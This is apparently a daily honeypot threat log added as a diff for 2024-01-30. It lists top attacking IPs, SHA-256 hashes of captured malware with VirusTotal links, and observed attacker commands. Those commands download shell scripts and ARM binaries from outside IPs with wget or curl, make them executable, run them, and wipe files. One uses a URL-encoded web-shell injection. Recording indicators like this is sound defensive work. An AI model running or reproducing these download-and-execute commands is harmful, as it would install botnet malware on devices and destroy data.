@@ -1,0 +1,29 @@
+Top 5 IPs for 2024-01-30:
+
+170.64.154.118
+110.182.65.183
+106.41.47.161
+49.89.111.178
+106.41.28.125
+
+Malware download: 
+5b73ec697c2cef1002b28f93b6448f581925c6f9e75171a36b524975a932abdb
+https://www.virustotal.com/gui/file/5b73ec697c2cef1002b28f93b6448f581925c6f9e75171a36b524975a932abdb
+03b146b8c8e2c29f1c30a22fac4f3f48b8028d0cc94efb60ee75047d104475c5
+https://www.virustotal.com/gui/file/03b146b8c8e2c29f1c30a22fac4f3f48b8028d0cc94efb60ee75047d104475c5
+28deca0ae18f347bc1bd44ee99be6a3a5cd0d97674c808023a3a1e616585c51c
+https://www.virustotal.com/gui/file/28deca0ae18f347bc1bd44ee99be6a3a5cd0d97674c808023a3a1e616585c51c
+7f0b4d9f4a27c0e3b07587a68538425f9f9da3f25578f35d1bec36f4da70990c
+https://www.virustotal.com/gui/file/7f0b4d9f4a27c0e3b07587a68538425f9f9da3f25578f35d1bec36f4da70990c
+4561daafad5dc900346392707337cefc3dadd682f611b0d98b2a02b52ccfbc9a
+https://www.virustotal.com/gui/file/4561daafad5dc900346392707337cefc3dadd682f611b0d98b2a02b52ccfbc9a
+e193ab472c37eeea33f5381998a063d27cb10c2ba76e8a3f1d45043543f450e1
+https://www.virustotal.com/gui/file/e193ab472c37eeea33f5381998a063d27cb10c2ba76e8a3f1d45043543f450e1
+
+Malciious Commands seen:
+
+cd /data/local/tmp/; rm *.nn;busybox wget http://141.98.11.208/5555.sh;chmod 777 5555.sh;sh 5555.sh
+cd /data/local/tmp/; rm -rf *; wget http://45.118.146.123/bwget.sh; sh bwget.sh; curl http://45.118.146.123/bc.sh; sh bc.sh; busybox wget http://45.118.146.123/bw.sh; sh bw.sh; rm -rf *
+/shell?pkill+-9+arm;pkill+-9+arm7;cd+/tmp/;rm+-rf+most*;wget+http:/\\/103.67.196.50/most-arm7;+chmod+777+most-arm7;./most-arm7+exploitprivate;wget+http:/\\/103.67.196.50/most-arm;+chmod+777+most-arm;./most-arm+exploitprivate;rm+-rf+most*
+cd /data/local/tmp/;rm -rf *sh* ; rm -rf *arm* ; rm -rf *ppc* ; rm -rf *x86* ; rm -rf *mips* ;rm -rf *mpsl* ; rm -rf *spc* ; rm -rf *m68k* ; busybox wget http://45.142.182.123/adb1.sh; sh adb1.sh; wget http://45.142.182.123/adb1.sh; sh adb1.sh; curl http://45.142.182.123/adb1.sh; sh adb1.sh; busybox wget http://45.142.182.123/adb2.sh; sh adb2.sh; wget http://45.142.182.123/adb2.sh; sh adb2.sh; curl http://45.142.182.123/adb2.sh; sh adb2.sh; busybox wget http://45.142.182.123/adb3.sh; sh adb3.sh; wget http://45.142.182.123/adb3.sh; sh adb3.sh; curl http://45.142.182.123/adb3.sh; sh adb3.sh
+
